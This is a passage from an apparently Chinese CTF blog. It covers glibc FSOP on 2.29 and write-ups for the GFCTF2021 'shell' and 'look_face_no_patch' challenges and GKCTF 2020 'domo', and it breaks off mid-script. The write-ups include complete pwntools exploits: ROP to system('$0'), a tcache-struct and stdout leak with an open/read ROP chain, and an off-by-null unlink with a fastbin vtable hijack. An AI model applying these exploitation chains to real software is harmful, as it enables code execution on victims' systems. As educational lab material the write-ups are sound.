b&#x27;\\x00&#x27;)+p64(vtable)    return IO_FILEfile_struct = pack_file(IO_list_all, 0, 1, bin_sh_addr, 0, IO_str_jumps-8)file_struct += p64(0)+p64(system_addr)\n\n这是我上一篇复现的exp当中的函数，我是根据其他师傅的exp写的，但是这里的_IO_read_base我也没在源码中看到有什么检验，我估计不用加上也行。\nGlibc2.29下的FSOP这应该是最后一个可以用FSOP的版本了，在Glibc2.31也会有这方面的使用，不过都不能直接getshell了。\n首先注意的是，我们在上面使用的是_IO_str_finish函数来利用的，但是这里的函数源码发生了改变：\nvoid_IO_str_finish (FILE *fp, int dummy)&#123;  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))    free (fp-&gt;_IO_buf_base);  fp-&gt;_IO_buf_base = NULL;  _IO_default_finish (fp, 0);&#125;\n\n可以看到这里直接替换成了free，所以我们这里是没有利用空间的了。\n其他师傅的查找发现在_IO_wfile_jumps这个vtable里依旧存在大量的函数指针，而且当中最好利用的则是_IO_wfile_sync函数，一样的先看一下源码：\nwint_t_IO_wfile_sync (FILE *fp)&#123;  ssize_t delta;  wint_t retval = 0;  /*    char* ptr = cur_ptr(); */  if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)    if (_IO_do_flush (fp))      return WEOF;  delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;  if (delta != 0)    &#123;      /* We have to find out how many bytes we have to go back in the\t external buffer.  */      struct _IO_codecvt *cv = fp-&gt;_codecvt;      off64_t new_pos;      int clen = (*cv-&gt;__codecvt_do_encoding) (cv);      if (clen &gt; 0)\t/* It is easy, a fixed number of input bytes are used for each\t   wide character.  */\tdelta *= clen;      else\t&#123;\t  /* We have to find out the hard way how much to back off.\t     To do this we determine how much input we needed to\t     generate the wide characters up to the current reading\t     position.  */\t  int nread;\t  fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;\t  nread = (*cv-&gt;__codecvt_do_length) (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,\t\t\t\t\t      fp-&gt;_IO_read_base,\t\t\t\t\t      fp-&gt;_IO_read_end, delta);\t  fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_base + nread;\t  delta = -(fp-&gt;_IO_read_end - fp-&gt;_IO_read_base - nread);\t&#125;      new_pos = _IO_SYSSEEK (fp, delta, 1);      if (new_pos != (off64_t) EOF)\t&#123;\t  fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;\t  fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;\t&#125;      else if (errno == ESPIPE)\t; /* Ignore error from unseekable devices. */      else\tretval = WEOF;    &#125;  if (retval != WEOF)    fp-&gt;_offset = _IO_pos_BAD;  /* FIXME: Cleanup - can this be shared? */  /*    setg(base(), ptr, ptr); */  return retval;&#125;\n\n可以注意到的是这两行代码：\nstruct _IO_codecvt *cv = fp-&gt;_codecvt;int clen = (*cv-&gt;__codecvt_do_encoding) (cv);\n\n这里又是将fp-&gt;_codecvt-&gt;__codecvt_do_encoding来做为函数来执行，参数则是fp-&gt;_codecvt\n再看_IO_codecvt结构体在源码是什么样子：\nstruct _IO_codecvt&#123;  void (*__codecvt_destr) (struct _IO_codecvt *);  enum __codecvt_result (*__codecvt_do_out) (struct _IO_codecvt *,\t\t\t\t\t     __mbstate_t *,\t\t\t\t\t     const wchar_t *,\t\t\t\t\t     const wchar_t *,\t\t\t\t\t     const wchar_t **, char *,\t\t\t\t\t     char *, char **);  enum __codecvt_result (*__codecvt_do_unshift) (struct _IO_codecvt *,\t\t\t\t\t\t __mbstate_t *, char *,\t\t\t\t\t\t char *, char **);  enum __codecvt_result (*__codecvt_do_in) (struct _IO_codecvt *,\t\t\t\t\t    __mbstate_t *,\t\t\t\t\t    const char *, const char *,\t\t\t\t\t    const char **, wchar_t *,\t\t\t\t\t    wchar_t *, wchar_t **);  int (*__codecvt_do_encoding) (struct _IO_codecvt *);  int (*__codecvt_do_always_noconv) (struct _IO_codecvt *);  int (*__codecvt_do_length) (struct _IO_codecvt *, __mbstate_t *,\t\t\t      const char *, const char *, size_t);  int (*__codecvt_do_max_length) (struct _IO_codecvt *);  _IO_iconv_t __cd_in;  _IO_iconv_t __cd_out;&#125;;\n\n可以看到这里的__codecvt_do_encoding偏移量为4，所以要进行利用只需要满足以下条件：\n1.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base2.fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end3.*(fp-&gt;_codecvt+4)=func,参数就是fp-&gt;_codecvt\n\n当然，我们这里依旧需要绕过_IO_flush_all_lokcp函数。\n后面会在梳理house_of_pig也就是在Glibc2.31下的利用。\n\n参考文章https://darkeyer.github.io/2020/08/17/FSOP%E5%9C%A8glibc2.29%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/\nhttps://xz.aliyun.com/t/5579\n","categories":["pwn"],"tags":["FSOP"]},{"title":"GFCTF2021复现","url":"/2022/01/11/GFCTF/","content":"深刻感觉到了这场比赛的难度，要是参加了的话我可能第一道题都完成不了。这次只复现了前面两道，因为第三题考得更多的是代码审计能力吧。\nshell题目保护只开了nx，主函数也是很简单的栈溢出。\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  system(&quot;echo &#x27;zltt lost his shell, can you find it?&#x27;&quot;);  read(0, buf, 0x38uLL);  return 0;&#125;\n\n但是问题是题目没有泄漏函数。所以这里存在一个冷知识\n\nsystem(“$0”)同样可以拿到shell\n\n在ida发现tip函数存在\n\ntext段可以即可拿到shell\nfrom pwn import *elf = ELF(&#x27;./shell&#x27;)# r = process(&#x27;./shell&#x27;)r = remote(b&#x27;1.14.71.254&#x27;, 28087)context.log_level = &#x27;debug&#x27;system = elf.plt[&#x27;system&#x27;]pop_rdi = 0x00000000004005e3shell_addr = 0x400541ret = 0x0000000000400416r.recvuntil(b&quot;\\n&quot;)payload = b&#x27;a&#x27;*(0x10+0x8)+p64(pop_rdi)+p64(shell_addr) + \\    p64(0x0000000000400416)+p64(system)r.sendline(payload)r.sendline(b&#x27;cat flag&#x27;)r.interactive()\n\nlook_face_no_patch所需知识点：tcache struct attack,_IO_FILE leak\n这个题目有点绕，不过先把知识点掌握了就好。\ntcache struct attack我这里主要是我自己总结可能阐述不是特别清楚所以看不懂的话可以看https://xz.aliyun.com/t/6828 这篇文章。\n字面意思也就是攻击tcache结构体。\n在做长安战役的比赛的off by one那道题目时我就在想，为什么我malloc一个chunk的时候要多出来一个0x250大小的chunk呢，现在知道这个chunk就是tcache的结构体。\n和unsortedbin里面存的main_arena不同的是tcache的结构体就直接放在heap段的第一个。\n\n可以看到上面的0x251大小的就是tcache结构体，再执行到free然后观察其内部结构。\n(因为刚刚的0x80不具有演示效果我改了一下)\n\n可以看见在tcache struct中heap_base+0x10–&gt;heap_base+0x50之间是存放的counts，而heap_base+0x50–&gt;heap_base+0x250之间存放的这是tcache_entry指针。\n利用方式首先利用double free\n\n此时chunk的fd指针指向的是他本身，而我们已知的tcache struct是在heap_base的位置所以只需要修改后面三位为010(这里是因为tcache_entry指向的是和malloc返回的指针只想同一个位置也就是heap_addr+0x10)所以我们只需要爆破第四位即可，那我们成功的概率也就是1/16。当我们爆破成功之后我们此时malloc两次chunk我们就可以得到tcache的结构体，将前面的内容全部填充为0xff即可绕过tcache，让后面free的chunk进入unsorted bin。\n_IO_FILE leak在我的这一篇博客提到过_IO_FILE write https://cv196082.gitee.io/2021/12/06/echo-back/ 不了解结构体可以先去看一下。\n当然同上面知识点一样，我也只是对于自己的总结可能阐述不清楚，若仍有困惑之处请看这位大师傅的 https://blog.wjhwjhn.com/archives/95/\n我写的那一篇博客提到过，内存中存在着三个文件指针，分别是stderr，stdout，stdin。\n\n这三个文件指针一般存放在bss段上用于输出输入数据，所指向的内容在libc中，而结构体内部的内容是可以被修改的，所以当我们有任意地址写的权限是就可以修改结构体实现stdout leak。下面就是stdout的内部结构：\n\n我们需要修改的是_flags和_IO_write_base，在这之间的三个指针，我们覆盖_IO_write_base势必会覆盖掉它们，但是这是stdout，而上面这三个主要是输入的时候才会有用，所以直接覆盖成p64(0)即可。\ncopy:解释以上指针的作用\n\n其中_IO_buf_base 和_IO_buf_end 是缓冲区建立函数。_IO_doallocbuf 会在里面建立输入输出缓冲区，并把基地址保存在_IO_buf_base 中，结束地址保存在_IO_buf_end 中。在建立里输入输出缓冲区后，如果缓冲区作为输出缓冲区使用，会将基址址给_IO_write_base，结束地址给_IO_write_end，同时_IO_write_ptr 表示为已经使用的地址。即_IO_write_base 到_IO_write_ptr 之间的空间是已经使用的缓冲区，_IO_write_ptr 到_IO_write_end 之间为剩余的输出缓冲区。\n\n所以根据以上说法的话，我们只需要将_IO_write_base调小即可输入_IO_write_base与_IO_write_ptr之间的内容。\n_flags为什么也要修改？/* Magic number and bits for the _flags field.  The magic number ismostly vestigial, but preserved for compatibility.  It occupies thehigh 16 bits of _flags; the low 16 bits are actual flag bits.  */#define _IO_MAGIC         0xFBAD0000 /* Magic number */#define _IO_MAGIC_MASK    0xFFFF0000#define _IO_USER_BUF          0x0001 /* Don&#x27;t deallocate buffer on close. */#define _IO_UNBUFFERED        0x0002#define _IO_NO_READS          0x0004 /* Reading not allowed.  */#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */#define _IO_EOF_SEEN          0x0010#define _IO_ERR_SEEN          0x0020#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don&#x27;t call close(_fileno) on close.  */#define _IO_LINKED            0x0080 /* In the list of all open files.  */#define _IO_IN_BACKUP         0x0100#define _IO_LINE_BUF          0x0200#define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */#define _IO_CURRENTLY_PUTTING 0x0800#define _IO_IS_APPENDING      0x1000#define _IO_IS_FILEBUF        0x2000/* 0x4000  No longer used, reserved for compat.  */#define _IO_USER_LOCK         0x8000\n\n上面是glibc中给出的常量。\n以puts函数输出的真正调用为例，具体调用的顺序是:\n_IO_puts -&gt; _IO_sputn -&gt; _IO_new_file_xsputn -&gt; _IO_overflow -&gt; _IO_new_file_overflow\n其中检查较为重要的是_IO_new_file_overflow函数。\nif (f-&gt;_flags &amp; _IO_NO_WRITES) / SET ERROR /&#123;    f-&gt;_flags |= _IO_ERR_SEEN;    __set_errno (EBADF);    return EOF;&#125;\n\n_IO_NO_WRITES使用于检验是否可以输出数据的，为1表示禁止，为0表示允许。这个_IO_NO_WRITES在stdout当中为0，在stdin当中为1。根据上面的表达式其实可以看出来我们必须满足 (f-&gt;_flags &amp; _IO_NO_WRITES)==0\n后面检测_IO_CURRENTLY_PUTTING\nif ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)&#123;    /* Allocate a buffer if needed. */    if (f-&gt;_IO_write_base == NULL)    &#123;        _IO_doallocbuf(f);        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);    &#125;    /* Otherwise must be currently reading.    If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,    logically slide the buffer forwards one block (by setting the    read pointers to all point at the beginning of the block).  This    makes room for subsequent output.    Otherwise, set the read pointers to _IO_read_end (leaving that    alone, so it can continue to correspond to the external position). */    if (__glibc_unlikely(_IO_in_backup(f)))    &#123;        size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;        _IO_free_backup_area(f);        f-&gt;_IO_read_base -= MIN(nbackup,                                f-&gt;_IO_read_base - f-&gt;_IO_buf_base);        f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;    &#125;    if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;    if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;&#125;\n\n主要关心的是_IO_CURRENTLY_PUTTING，这个使用来判断是否初始化的，若是没有初始化过则为0，若是初始化过则为1，一般输出过内容之后就变成了1除非它输出任何东西。如果这里没通过那我们的_IO_write_base会被修改那就达不到泄漏的目的，所以我们要满足 (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)==1\n最后一个检测\nif (do_write)&#123;    count = new_do_write (f, s, do_write);    to_do -= count;    if (count &lt; do_write)    return n - to_do;&#125;\n\n这一部分是进入new_do_write (f, s, do_write);函数。\nstatic size_tnew_do_write(FILE *fp, const char *data, size_t to_do)&#123;    size_t count;    if (fp-&gt;_flags &amp; _IO_IS_APPENDING)        /* On a system without a proper O_APPEND implementation,        you would need to sys_seek(0, SEEK_END) here, but is        not needed nor desirable for Unix- or Posix-like systems.        Instead, just indicate that offset (before and after) is        unpredictable. */        fp-&gt;_offset = _IO_pos_BAD;    else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    &#123;        off64_t new_pos = _IO_SYSSEEK(fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);        if (new_pos == _IO_pos_BAD)            return 0;        fp-&gt;_offset = new_pos;    &#125;    count = _IO_SYSWRITE(fp, data, to_do);    if (fp-&gt;_cur_column &amp;&amp; count)        fp-&gt;_cur_column = _IO_adjust_column(fp-&gt;_cur_column - 1, data, count) + 1;    _IO_setg(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;    fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))                             ? fp-&gt;_IO_buf_base                             : fp-&gt;_IO_buf_end);    return count;&#125;\n\n这里需要注意的是这两个这两句\nif (fp-&gt;_flags &amp; _IO_IS_APPENDING)\nelse if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)\n我们这里无论进入那一个语句都是可以执行到下面的，但是一般来说我们都会选择进入第一个因为他内部的代码较少，只有一行。\n所以根据上面的结论来说我的可以计算出_flags的值。\n1.(fp-&gt;_flags &amp; _IO_NO_WRITES) == 02.(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 13.(fp-&gt;_flags &amp; _IO_IS_APPENDING) == 1\n\n计算可得，fp-&gt;_flags = 0xfbad1800, 其中_IO_MAGIC = 0xfdab0000，这是个 Magic Number，是固定的。\n一般的利用方式一般是将chunk释放进unsorted bin当中，是chunk保存main_arena，然后利用partial overwrite爆破出_IO_2_1_stdout_结构体的位置，随后就是根据上面得出来的值得到_IO_2_1_stdout_的地址来获取libc\n解题有了以上的基础我们才可以正式开始看这道题目。\n检查保护\n保护全开，好样的！\n流程分析题目类型是很常规的菜单题，但是没有edit函数和show函数。先看add函数\nunsigned __int64 add()&#123;  int i; // [rsp+8h] [rbp-498h]  int v2; // [rsp+Ch] [rbp-494h]  char s[1160]; // [rsp+10h] [rbp-490h] BYREF  unsigned __int64 v4; // [rsp+498h] [rbp-8h]  v4 = __readfsqword(0x28u);  memset(s, 0, 0x80uLL);  puts(&quot;cont...&quot;);  v2 = read(0, s, 0x78uLL);  if ( v2 &gt; 112 || v2 &lt; 0 )    run();  s[v2] = 10;  ptr = malloc(v2);  for ( i = 0; s[i] != 10; ++i )    *((_BYTE *)ptr + i) = s[i];  puts(&quot;OK&quot;);  return v4 - __readfsqword(0x28u);&#125;\n\n这里我们malloc的chunk的size是由我们输入的内容长度确定的，而下面的for循环，是将数据写进去，当出现b’\\n’时就会结束循环停止写入。\n再看dele函数\nint dele()&#123;  if ( !ptr )    run();  if ( (unsigned int)dele_time &gt; 2 )    run();  free(ptr);  ++dele_time;  return puts(&quot;OK&quot;);&#125;\n\n这个题很怪的一点就是我们只能删除当前创建的chunk并且总共只能删除三次，而且nssctf贴心的告诉了我们题目运行的环境是ubuntu18那libc版本就是2.27那就代表存在tcache，在不知道tcache struct attack的情况就直接想放弃了。\n利用分析\n首先利用double free让我们创建chunk的fd指针只想自身。\n\n可以看到我们利用爆破最后一个字节修改了tcache struct当中记录counts的值，再观察一下bin的情况\n\n后面也是一样的。接着我们释放chunk，此时储存tcache struct的chunk进入unsorted bin。\n\n接着我们创建一个0x50大小的chunk(至于为什么我放到代码当中解释)。\n\n接着开始猜stdout的地址。到这一步，成功的概率只有1/256了所以我就不做过程截图了(因为我自己打本地的时候等了五六分钟，他给我来一句程序运行太多，就没了)所以下面直接给exp了。\nexpfrom pwn import *from LibcSearcher import *elf = ELF(&quot;./look_face_no_patch&quot;)r = process(&#x27;./look_face_no_patch&#x27;)context.log_level = &#x27;debug&#x27;def create(contents):    r.recvuntil(b&#x27;&gt;&gt;&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;cont...&#x27;)    r.sendline(contents)def delete():    r.recvuntil(b&#x27;&gt;&gt;&#x27;)    r.sendline(b&#x27;2&#x27;)def boom():    create(b&#x27;\\x00&#x27;*0x30)    delete()    delete()    heap = 0x8010    create((p16(heap)+b&#x27;\\n&#x27;).ljust(0x30, b&#x27;\\x00&#x27;))    create(b&quot;\\n&quot;.ljust(0x30, b&#x27;\\x00&#x27;))    create(b&#x27;\\xff&#x27;*0x30)    delete()    create(b&#x27;\\x00&#x27;*0x40)# 放开前面的counts区域，修改后面的tcache_entry指针，并且是tcache_counts为0，为后续做铺垫    stdout = 0x8760    create((p16(stdout)+b&#x27;\\n&#x27;).ljust(0x10, b&#x27;\\x00&#x27;))# 开始爆破stdout的地址(也只需要爆破一位)，这一块chunk是切割的unsorted bin当中的内容，也就是tcache_struct，下去思考一下就能想到我们爆破的是tcache大小为0x40的指针    create((p64(0xfbad1800)+p64(0)*3+p64(0x60)+b&#x27;\\n&#x27;).ljust(0x30, b&#x27;\\x00&#x27;))# 这一步开始修改结构体内部的值    r.recvuntil(b&#x27;\\n&#x27;)    if u64(r.recv(8)) != 0xfbad1800:        return 0    r.recv(0x20)    stdout = u64(r.recv(6).ljust(0x8, b&#x27;\\x00&#x27;))-131    print(hex(stdout))    # libc = LibcSearcher(&#x27;_IO_2_1_stdout_&#x27;, stdout)    libc = ELF(&#x27;./libc-2.27.so&#x27;)    # success(libc.address)    libc_base = stdout-libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]    pop_rdi = 0x000000000002155f+libc_base    pop_rsi = 0x0000000000023e8a+libc_base    pop_rdx = 0x0000000000001b96+libc_base    push_rsp = 0x0000000000024ef4+libc_base    open_addr = libc_base+libc.symbols[&#x27;open&#x27;]    read_addr = libc_base+libc.symbols[&#x27;read&#x27;]    write_addr = libc_base+libc.symbols[&#x27;write&#x27;]    malloc_hook = libc_base+libc.symbols[&#x27;__malloc_hook&#x27;]    create((p64(malloc_hook)+b&#x27;\\n&#x27;).ljust(0x10, b&#x27;\\x00&#x27;))# 这一步我们又是从unsorted bin当中切出来位置，但因为上面用了0x20所以我们修改的tcache_entry是大小为0x80的chunk。后面就是正常的构造ROP了    create((p64(push_rsp)+b&#x27;/flag&#x27;+b&#x27;\\n&#x27;).ljust(0x70, b&#x27;\\x00&#x27;))    payload = p64(pop_rdi)+p64(malloc_hook+0x8)+p64(open_addr)+p64(pop_rdi) + \\        p64(3)+p64(pop_rdx)+p64(0x50)+p64(pop_rsi) + \\        p64(malloc_hook+10)+p64(puts)+b&#x27;\\n&#x27;    create(payload.ljust(0x70, b&#x27;\\x00&#x27;))if __name__ == &#x27;__main__&#x27;:    while 1:        try:            res = boom()            if(res == 0):                r = process(&#x27;./look_face_no_patch&#x27;)                continue            break        except:            r = process(&#x27;./look_face_no_patch&#x27;)            continue    gdb.attach(r)    r.interactive()\n\n上面代码解释可能难以理解，所以我画了一张图。\n我们将存放tcache_struct的chunk释放进unsorted bin当中的后续情况如下图：\n\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"GKCTF_2020_domo","url":"/2022/02/10/GKCTF-2020-domo/","content":"复现一场比赛被第一道题卡了贼久，我太菜了，越学pwn越在想要是比赛第一题就是这个我连一道题都做不出来怎么办哦。\n吐槽: nss给的libc怎么也不对啊？\n\n简要分析__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  int v4; // [rsp+0h] [rbp-20h] BYREF  int v5; // [rsp+4h] [rbp-1Ch] BYREF  int v6; // [rsp+8h] [rbp-18h] BYREF  int v7; // [rsp+Ch] [rbp-14h] BYREF  __int64 v8; // [rsp+10h] [rbp-10h]  unsigned __int64 v9; // [rsp+18h] [rbp-8h]  v9 = __readfsqword(0x28u);  v4 = 1;  v5 = 1;  v6 = 1;  sub_BA0(a1, a2, a3);  sub_C9D();  puts(&quot;Welcome to GKCTF&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      while ( 1 )      &#123;        while ( 1 )        &#123;          menu();                               //   puts(&quot;1: Add a user&quot;);                                                //   puts(&quot;2: Delete a user&quot;);                                                //   puts(&quot;3: Show a user&quot;);                                                //   puts(&quot;4: Edit a user&quot;);                                                //   return puts(&quot;5: Exit&quot;);          printf(&quot;&gt; &quot;);          _isoc99_scanf(&quot;%d&quot;, &amp;v7);          if ( v7 != 1 )            break;          add(&quot;%d&quot;, &amp;v7);        &#125;        if ( v7 != 2 )          break;        delete(&quot;%d&quot;, &amp;v7);      &#125;      if ( v7 != 3 )        break;      show(&quot;%d&quot;, &amp;v7);    &#125;    if ( v7 != 4 )      break;    edit(&amp;v4, &amp;v5, &amp;v6);  &#125;  v8 = seccomp_init(2147418112LL);  seccomp_rule_add(v8, 0LL, 59LL, 0LL);  seccomp_rule_add(v8, 0LL, 4294957238LL, 0LL);  seccomp_rule_add(v8, 0LL, 10LL, 0LL);  seccomp_load(v8);  puts(&quot;oh,Bye&quot;);  return 0LL;&#125;\n\n在main内的最后开启了沙盒，可以看出来禁用了execve的调用。\nunsigned __int64 __fastcall sub_E6C(const char *a1)&#123;  size_t nbytes; // [rsp+0h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  if ( check(a1) == 1 &amp;&amp; chunk_num[0] &lt;= 8 )  &#123;    HIDWORD(nbytes) = 0;    while ( SHIDWORD(nbytes) &lt;= 8 )    &#123;      if ( !*(&amp;chunk_arr + SHIDWORD(nbytes)) )      &#123;        puts(&quot;size:&quot;);        _isoc99_scanf(&quot;%d&quot;, &amp;nbytes);        if ( (nbytes &amp; 0x80000000) == 0LL &amp;&amp; nbytes &lt;= 288 )        &#123;          *(&amp;chunk_arr + SHIDWORD(nbytes)) = malloc(nbytes);          puts(&quot;content:&quot;);          read(0, *(&amp;chunk_arr + SHIDWORD(nbytes)), nbytes);          *(*(&amp;chunk_arr + SHIDWORD(nbytes)) + nbytes) = 0;// off by null          ++chunk_num[0];        &#125;        else        &#123;          puts(&quot;sobig&quot;);        &#125;        return __readfsqword(0x28u) ^ v3;      &#125;      ++HIDWORD(nbytes);    &#125;  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\n在add函数存在明显的off by null漏洞。\n__int64 sub_C16()&#123;  void *(*volatile v0)(size_t, const void *); // rax  bool v1; // dl  void (*volatile v2)(void *, const void *); // rax  v0 = _malloc_hook;  v1 = v0 != 0LL;  v2 = _free_hook;  if ( !v1 &amp;&amp; v2 == 0LL )    return 1LL;  puts(&quot;oh no&quot;);  return 0LL;&#125;\n\n在add函数和delete函数的开头部分都存在这个函数检验_malloc_hook和_free_hook是否被修改。所以常规的修改hook为one_gadget是不现实的了。\nunsigned __int64 __fastcall sub_115E(_DWORD *a1, _DWORD *a2, _DWORD *a3)&#123;  void *buf; // [rsp+20h] [rbp-10h] BYREF  unsigned __int64 v6; // [rsp+28h] [rbp-8h]  v6 = __readfsqword(0x28u);  buf = 0LL;  if ( check() == 1 )  &#123;    if ( *a1 &amp;&amp; *a2 &amp;&amp; *a3 )    &#123;      puts(&quot;addr:&quot;);      _isoc99_scanf(&quot;%ld&quot;, &amp;buf);      puts(&quot;num:&quot;);      read(0, buf, 1uLL);      *a1 = 0;      *a2 = 0;      *a3 = 0;      puts(&quot;starssgo need ten girl friend &quot;);    &#125;    else    &#123;      puts(&quot;You no flag&quot;);    &#125;  &#125;  return __readfsqword(0x28u) ^ v6;&#125;\n\n这里的edit函数和常规完全不一样，这里是存在一个任意地址写一字节并且只允许执行一次。\n利用过程leak libc addr当unsortedbin只有一个chunk的时候它的fd指针和bk指针都是指向main_arena的。\n\n然后申请一个同样大小的chunk并且输入b’a’*7+b’\\n’\n\n即可获得main_arena的地址，然后计算出libc_base的地址。\nleak heap addr利用思路跟上面类似，不过是用fastbin。\n\n此时他的fd指针指向的是他下一个chunk。申请一个size相同并且输入空字符即可求出heap的地址。\nchunk overlap接着就是利用堆的堆放方式利用off by null触发unlink为fastbin attack做准备。\ncreate(0x40, b&#x27;&#x27;)create(0x68, b&#x27;&#x27;)create(0xf0, b&#x27;&#x27;)delete(0)create(0x40, p64(0)+p64(0xb1)+p64(heap_addr+0x18) +       p64(heap_addr+0x20)+p64(heap_addr+0x10))delete(1)create(0x68, b&#x27;\\x00&#x27;*0x60+p64(0xb0))delete(2)\n\n\n我们使用以上三个chunk来进行，并且在chunk0的里面我们伪造一个size为0xb0的fake chunk。\n\n可以看到经过上面我们已经修改了size为0x100的inuse位的值0，那么此时我们free掉它。\n\n可以看到此时我们伪造的fake chunk的size已经变为了0x1b1\n\n并且可以看到unlink后的fake chunk已经进入了unsorted bin了。\nvtable在进行fastbin attack之前我们先先看看vtable是个什么东西\n\n可以看到下面的vtable变量，存放的值是_IO_file_jumps的指针\n\n可以看到_IO_file_jumps结构内存放很多函数的指针，一系列标准IO函数都会调用这些指针，但是_IO_file_jumps结构本身是不可写的，但是我们可以修改vtable指向我们伪造的_IO_file_jumps结构。\nfastbin attackcreate(0xc0, b&#x27;&#x27;)delete(1)delete(2)_IO_2_1_stdin_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]info(hex(_IO_2_1_stdin_))fake_chunk = _IO_2_1_stdin_+160-3create(0xc0, b&#x27;a&#x27;*0x38+p64(0x71)+p64(fake_chunk))  create(0xa8, p64(0)*2+p64(one_gadget)*19)\n\n首先申请一个size为0xc0的chunk，而这个chunk会在unsorted bin当中的fake chunk中割出一部分拿给我们。所以我们可以通过这样一个chunk来修改我们放到fastbin当中的chunk。\n先看_IO_2_1_stdin_附近适合用来构造fake chunk的地方。\n\n可以看到这个位置是很适合拿来做chunk的size的也就是_IO_2_1_stdin_+160-3\n\n可以看到fastbin当中的chunk被我们改变了到了制定位置，然后伪造vtable也在了，最后修改getshell即可\n综上得出expfrom pwn import *r = process(&#x27;./domo&#x27;)elf = ELF(&#x27;./domo&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)def create(size, content):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size:&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.sendline(content)def delete(index):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))def show(index):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))def edit(address, num):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;addr:&#x27;)    r.senline(bytes(str(address), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;num:&#x27;)    r.sendline(bytes(str(num), encoding=&#x27;utf-8&#x27;))create(0x40, b&#x27;&#x27;)  # 0create(0x68, b&#x27;&#x27;)  # 1create(0xf0, b&#x27;&#x27;)  # 2create(0x10, b&#x27;&#x27;)  # 3delete(2)create(0xf0, b&#x27;a&#x27;*7)  # 2show(2)print(r.recvuntil(b&#x27;\\n&#x27;))print(r.recvuntil(b&#x27;a\\n&#x27;))main_arena_88 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))info(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = 0xf03a4+libc_baseprint(hex(one_gadget))create(0x10, b&#x27;&#x27;)  # 4delete(3)delete(4)create(0x10, b&#x27;&#x27;)  # 3show(3)print(r.recvuntil(b&#x27;\\n&#x27;))heap_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10a+0x10info(hex(heap_addr))delete(3)delete(0)create(0x40, p64(0)+p64(0xb1)+p64(heap_addr+0x18) +       p64(heap_addr+0x20)+p64(heap_addr+0x10))  # 0delete(1)create(0x68, b&#x27;\\x00&#x27;*0x60+p64(0xb0))  # 